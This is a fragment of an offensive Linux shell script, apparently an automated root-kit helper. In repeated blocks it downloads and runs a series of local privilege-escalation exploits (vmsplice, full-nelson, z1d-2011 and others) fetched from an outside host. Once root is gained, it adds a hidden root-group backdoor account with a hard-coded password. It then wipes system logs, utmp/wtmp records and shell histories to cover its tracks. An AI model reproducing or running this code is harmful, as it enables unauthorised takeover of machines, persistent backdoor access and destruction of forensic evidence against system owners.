	$DLER http://bie.nazuka.net/localroot/exp3
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 exp3
		./exp3
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/exploit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 exploit
		./exploit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/full-nelson
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 full-nelson
		./full-nelson
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/gayros
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 gayros
		./gayros
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/lenis.sh
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 lenis.sh
		./lenis.sh
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/local-2.6.9-2005-2006
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 local-2.6.9-2005-2006
		./local-2.6.9-2005-2006
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/local-root-exploit-gayros
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 local-root-exploit-gayros
		./local-root-exploit-gayros
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/priv4
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 priv4
		./priv4
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/pwnkernel
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 pwnkernel
		./pwnkernel
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/root.py
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 root.py
		./root.py
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/runx
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 runx
		./runx
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/tivoli
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 tivoli
		./tivoli
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/ubuntu
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 ubuntu
		./ubuntu
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/vmsplice-local-root-exploit
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 vmsplice-local-root-exploit
		./vmsplice-local-root-exploit
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

if [ $GOTROOT -z ] 2> /dev/null
then
	$DLER http://bie.nazuka.net/localroot/z1d-2011 
	if [ $CURLIT -z ] 2> /dev/null
	then
		chmod 777 z1d-2011
		./z1d-2011
	else
		chmod 777 hisetup
		./hisetup
	fi
	fcheckr00t
fi

cd ..
rm -rf exploits
CNT=''
DLER=''
CURLIT=''

if [ $GOTROOT = 1 ] 2> /dev/null
then
	RUSER='somesecguy'
	RPASS='g0tr00t'
	echo ' [*] Adding r00t user..'
	useradd -g 0 -G root -M -s /bin/bash -p $RPASS $RUSER
	echo
	echo " [*] Added r00t user: $RUSER"
	echo " [*] p455w0rd:  $RPASS"
	echo " [*] Clearing logs.."
	RPASS=''
	RUSER=''
	GOTROOT=''
	rm -rf /tmp/logs 2> /dev/null
	rm -rf /root/.ksh_history 2> /dev/null
	rm -rf /root/.bash_history 2> /dev/null
	rm -rf /root/.bash_logout 2> /dev/null
	rm -rf /usr/local/apache/logs 2> /dev/null
	rm -rf /usr/local/apache/log 2> /dev/null
	rm -rf /var/apache/logs 2> /dev/null
	rm -rf /var/apache/log 2> /dev/null
	rm -rf /var/run/utmp 2> /dev/null
	rm -rf /var/logs 2> /dev/null
	rm -rf /var/log 2> /dev/null
	rm -rf /var/adm 2> /dev/null
	rm -rf /etc/wtmp 2> /dev/null
	rm -rf /etc/utmp 2> /dev/null
	echo " [*] You g0tr00t, horray for you..."
	whoami
	id
else
	echo " [*] You didn't g0tr00t, sucks to be you..."
	whoami
	id
fi
